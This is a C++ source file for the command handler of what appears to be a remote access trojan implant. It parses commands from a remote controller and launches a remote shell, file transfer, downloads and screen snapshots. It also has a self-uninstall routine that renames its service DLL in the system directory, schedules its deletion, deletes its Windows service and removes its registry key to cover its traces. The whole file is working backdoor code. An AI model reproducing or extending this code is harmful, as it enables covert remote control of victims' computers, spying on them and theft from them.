#include "KernelManager.h"
#include "FunctionThread.h"
CKernelManager::CKernelManager(CClient *pClient,char* strServicename):CBasicManager(pClient)
{
	m_nThreadCount=0;
	b_signed=FALSE;
	strcpy(m_servicename,strServicename);
	memset(m_hThread,0,sizeof(m_hThread));
	//b_cmdruning=FALSE;

}
CKernelManager::~CKernelManager()
{
	for(int i = 0; i < m_nThreadCount; i++)
	{
		TerminateThread(m_hThread[i], -1);
		CloseHandle(m_hThread[i]);
	}
}


void CKernelManager::UnInstallService()
{
	char	strServiceDll[MAX_PATH];
	char	strRandomFile[MAX_PATH];

	GetSystemDirectory(strServiceDll, sizeof(strServiceDll));
	lstrcat(strServiceDll, "\\");
	lstrcat(strServiceDll, m_servicename);
	lstrcat(strServiceDll, "ex.dll");

	// 安装文件随机改名，重启时删除
	wsprintf(strRandomFile, "%d.bak", GetTickCount());
	MoveFile(strServiceDll, strRandomFile);
	MoveFileEx(strRandomFile, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);

	// 删除离线记录文件
	char		Desc[MAX_PATH];
	char		regKey[1024];
	SC_HANDLE	service = NULL, scm = NULL;
	SERVICE_STATUS	Status;
	__try
	{
		scm = OpenSCManager(NULL, NULL,
			SC_MANAGER_ALL_ACCESS);
		service = OpenService(
			scm, m_servicename,
			SERVICE_ALL_ACCESS);
		if (scm==NULL&&service == NULL)
			__leave;

		if (!QueryServiceStatus(service, &Status))
			__leave;

		if (Status.dwCurrentState != SERVICE_STOPPED)
		{
			if (!ControlService(service,
				SERVICE_CONTROL_STOP, 
				&Status))
				__leave;
			Sleep(800);
		}
		DeleteService(service);

		memset(regKey, 0, sizeof(regKey));
		wsprintf(regKey, "SYSTEM\\CurrentControlSet\\Services\\%s", m_servicename);
		SHDeleteKey(HKEY_LOCAL_MACHINE, regKey);
	}
	__finally
	{
		if (service != NULL)
			CloseServiceHandle(service);
		if (scm != NULL)
			CloseServiceHandle(scm);
	}
	b_quit=true;
}

void CKernelManager::OnReceive(LPBYTE lpBuff,DWORD dwSize)
{
	int i;
	for (i=0;i<dwSize;i++)
	{
		if(lpBuff[0]=='R'&&lpBuff[1]=='E'&&lpBuff[2]=='P')break;
		lpBuff++;

	}
	if (i==dwSize)
	{
		printf("NOT FOUND\n");
		return;
	}

	printf("%s\n",lpBuff);

	char strID[5];
	memcpy(strID,lpBuff+3,3);
	strID[3]='\0';

	int ID=atoi(strID);
	
	char strCMD[5];
	memcpy(strCMD,lpBuff+6,3);
	strCMD[3]='\0';
	int CMD=atoi(strCMD);


	switch (CMD)
	{
	case COMMAND_SIGNED:
		printf("signed!\nID:%d\n",ID);
		m_id=ID;b_signed=TRUE;
		break;

	case COMMAND_SHELL:
		if (m_hThread[COMMAND_SHELL-2]!=NULL)break;
		m_hThread[COMMAND_SHELL-2] =CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ShellManagerThread, (LPVOID)this, 0, NULL);
		m_nThreadCount++;
		break;

	case COMMAND_TRAN:
		if(m_hThread[COMMAND_TRAN-2]!=NULL)break;
		m_hThread[COMMAND_TRAN-2]=CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)TranThread,(LPVOID)this,0,NULL);
		break;

	case COMMAND_DOWNLOAD:
        CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)DownloadThread,(LPVOID)this,0,NULL);
		break;

	case COMMAND_SNAP:
		//CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)SnapThread,(LPVOID)this,0,NULL);
		MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SnapThread,
			(LPVOID)this, 0, NULL, true);
		OutputDebugString("snapshot");
		break;

	case COMMAND_UNINSTALL:
		UnInstallService();
		break;
	default:break;
	}
}